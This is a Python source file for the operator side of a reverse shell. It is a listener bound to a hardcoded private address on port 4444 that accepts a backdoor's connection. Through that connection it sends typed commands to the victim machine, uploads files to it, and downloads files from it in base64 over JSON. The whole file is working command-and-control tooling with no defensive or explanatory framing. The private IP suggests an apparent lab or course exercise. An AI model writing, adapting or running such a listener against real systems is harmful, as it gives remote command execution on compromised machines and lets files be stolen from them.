import socket,json,base64,sys

class Listener:
    def __init__(self,ip,port):

        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)

        print("[+] Waiting for connection ")
        self.connection , adreess = listener.accept()
        print("[+] Got connected")
    
    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
    
    def reliable_receive(self):
        data =""
        while True:
            try:
                data += self.connection.recv(1024).decode()
                return json.loads(data)
            except ValueError:
                continue
    def download_file(self,path,contain):
        path = path.split('\\')[-1]
        with open(path,'wb') as file:
            file.write(base64.b64decode(contain))
            print("[+] File Downloaded.")

    def read_file(self,path):
        with open(path,'rb') as file:
            return base64.b64encode(file.read()).decode()
        
    def execute_command(self,command):
        self.reliable_send(command)
        if command[0] == 'exit':
            self.connection.close()
            sys.exit()
        return self.reliable_receive()
        
    def run(self):
        while True:
            try:
                command = input('>> ')
                command = command.split(" ")
                if command[0] == 'upload':
                    command.append(self.read_file(command[1]))
                answer = self.execute_command(command)
                if command[0] == 'download' and '[-]' not in answer:
                    self.download_file(command[1],answer.encode())
                else:
                    print(answer)
            except :
                print('[-] Something went wrong')

listener = Listener("192.168.220.128",4444)
listener.run()